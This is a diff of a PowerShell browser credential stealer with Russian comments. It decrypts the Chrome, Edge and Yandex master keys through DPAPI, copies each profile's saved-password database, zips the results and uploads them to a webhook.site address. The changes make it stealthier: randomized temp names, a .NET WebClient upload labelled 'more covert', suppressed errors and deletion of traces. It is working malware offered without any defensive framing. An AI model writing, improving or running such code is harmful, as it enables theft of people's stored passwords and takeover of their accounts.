@@ -1,62 +1,50 @@
 # [ Настройки ]
-$webhookUrl = "https://webhook.site/94f7a3be-c2d7-4eaa-872b-7a1e5897bf12"
-$workDir = "$env:TEMP\work_data"
-if (Test-Path $workDir) { Remove-Item -Recurse -Force $workDir }
+$url = "https://webhook.site/94f7a3be-c2d7-4eaa-872b-7a1e5897bf12"
+$workDir = "$env:TEMP\sys_cache_$(Get-Random)"
 New-Item -ItemType Directory -Path $workDir -Force | Out-Null
-$reportFile = "$workDir\keys.txt"
+$logFile = "$workDir\info.log"
 
-# Сигнал о начале работы (для диагностики)
-& curl.exe -X POST -d "status=started" $webhookUrl
-
-# Функция для сбора данных
-function Get-BrowserData($path, $localStatePath, $name) {
-    if (Test-Path $localStatePath) {
+# Функция сбора данных
+function Export-Data($path, $state, $label) {
+    if (Test-Path $state) {
         try {
-            $localState = Get-Content $localStatePath -Raw | ConvertFrom-Json
-            $encKey = [Convert]::FromBase64String($localState.os_crypt.encrypted_key)[5..$([Convert]::FromBase64String($localState.os_crypt.encrypted_key).Length-1)]
-            $masterKey = [System.Security.Cryptography.ProtectedData]::Unprotect($encKey, $null, [System.Security.Cryptography.DataProtectionScope]::CurrentUser)
-            Add-Content $reportFile "--- $name ---`nMaster Key: $([Convert]::ToBase64String($masterKey))`n"
-            
-            if (Test-Path $path) {
-                Copy-Item $path -Destination "$workDir\$name`_LoginData" -Force
-            }
-        } catch { 
-            Add-Content $reportFile "Error in $name: $_" 
-        }
+            $json = Get-Content $state -Raw | ConvertFrom-Json
+            $key = [Convert]::FromBase64String($json.os_crypt.encrypted_key)[5..$([Convert]::FromBase64String($json.os_crypt.encrypted_key).Length-1)]
+            $dec = [System.Security.Cryptography.ProtectedData]::Unprotect($key, $null, [System.Security.Cryptography.DataProtectionScope]::CurrentUser)
+            Add-Content $logFile "[$label] Key: $([Convert]::ToBase64String($dec))"
+            if (Test-Path $path) { Copy-Item $path -Destination "$workDir\$label`_db" -Force }
+        } catch { Add-Content $logFile "[$label] Error: $_" }
     }
 }
 
-# Список путей для проверки
-$browsers = @(
-    @{n="Chrome"; p="$env:LOCALAPPDATA\Google\Chrome\User Data"};
-    @{n="Edge"; p="$env:LOCALAPPDATA\Microsoft\Edge\User Data"};
-    @{n="Yandex"; p="$env:LOCALAPPDATA\Yandex\YandexBrowser\User Data"}
+# Поиск по популярным браузерам и их профилям
+$targets = @(
+    @{n="CH"; p="Google\Chrome"},
+    @{n="ED"; p="Microsoft\Edge"},
+    @{n="YX"; p="Yandex\YandexBrowser"}
 )
 
-foreach ($b in $browsers) {
-    $base = $b.p
-    $name = $b.n
+foreach ($t in $targets) {
+    $base = "$env:LOCALAPPDATA\$($t.p)\User Data"
     if (Test-Path $base) {
-        # Проверяем Default и Profile 1..5
-        $profiles = @("Default", "Profile 1", "Profile 2", "Profile 3", "Profile 4", "Profile 5")
-        foreach ($p in $profiles) {
-            $ld = "$base\$p\Login Data"
-            $ls = "$base\Local State"
-            if (Test-Path $ld) { Get-BrowserData $ld $ls "$name`_$p" }
+        $profs = Get-ChildItem $base -Directory | Where-Object { $_.Name -match "Default|Profile" }
+        foreach ($pr in $profs) {
+            $ld = Join-Path $pr.FullName "Login Data"
+            $ls = Join-Path $base "Local State"
+            if (Test-Path $ld) { Export-Data $ld $ls "$($t.n)_$($pr.Name)" }
         }
     }
 }
 
-# Проверка: есть ли что отправлять?
-$files = Get-ChildItem $workDir
-if ($files.Count -gt 0) {
-    $zipFile = "$env:TEMP\logs.zip"
-    Compress-Archive -Path "$workDir\*" -DestinationPath $zipFile -Force
-    & curl.exe -X POST -F "file=@$zipFile" $webhookUrl
-    Remove-Item $zipFile
-} else {
-    & curl.exe -X POST -d "status=no_data_found" $webhookUrl
+# Упаковка и отправка через .NET (более скрытно)
+if ((Get-ChildItem $workDir).Count -gt 0) {
+    $zip = "$env:TEMP\report_$(Get-Random).zip"
+    Compress-Archive -Path "$workDir\*" -DestinationPath $zip -Force
+    try {
+        $wc = New-Object System.Net.WebClient
+        $wc.UploadFile($url, "POST", $zip) | Out-Null
+    } catch {}
+    Remove-Item $zip -ErrorAction SilentlyContinue
 }
 
-# Чистка
-Remove-Item -Recurse -Force $workDir
+Remove-Item -Recurse -Force $workDir -ErrorAction SilentlyContinue
